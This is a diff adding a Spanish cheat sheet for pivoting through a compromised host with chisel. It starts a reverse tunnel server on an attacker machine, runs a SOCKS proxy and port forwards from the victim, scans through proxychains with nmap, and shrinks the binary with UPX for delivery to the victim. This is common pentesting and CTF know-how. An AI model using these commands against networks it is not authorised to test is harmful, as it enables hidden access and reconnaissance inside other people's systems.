@@ -1,0 +1,32 @@
+▶ Servidor (Ejecutar en máquina atacante):
+  ./chisel server -p 8000 --reverse
+
+▶ Cliente (Crear proxy SOCKS5 desde máquina víctima):
+  ./chisel client $IP:8000 R:socks
+
+▶ Configurar proxychains.conf:
+ # Edita /etc/proxychains.conf y añade en la parte final:
+ # socks5 127.0.0.1 1080
+
+▶ Escaneo por TCP con nmap y Proxychains:
+  proxychains nmap --top-ports 500 --open -T4 -v -n -sT -Pn $IP -oG allPorts 2>&1 | grep -v "timeout"
+
+▶ Detección de versiones y servicios para cada puerto con Proxychains:
+  proxychains nmap -sCV -p $PORTS -T4 -Pn $IP -oN targeted -oX targeted.xml
+
+▶ Reverse Port Forwarding (Redirigir puerto remoto a local):
+  ./chisel client $IP:8000 R:8001:127.0.0.1:8001
+
+▶ Múltiples Túneles (Redirigir varios puertos):
+  ./chisel client $IP:8000 R:80:127.0.0.1:80 R:443:127.0.0.1:443
+
+▶ Túnel con Autenticación (Usar clave):
+  ./chisel client --auth user:pass $IP:8000 R:socks
+ # Para reducir el peso de chisel para enviar a la máquina víctima sería de la siguiente forma:
+
+▶ Reducir el peso de Chisel con UPX:
+  upx --best chisel
+
+▶ Comprobando peso de Chisel:
+  du -h chisel
+
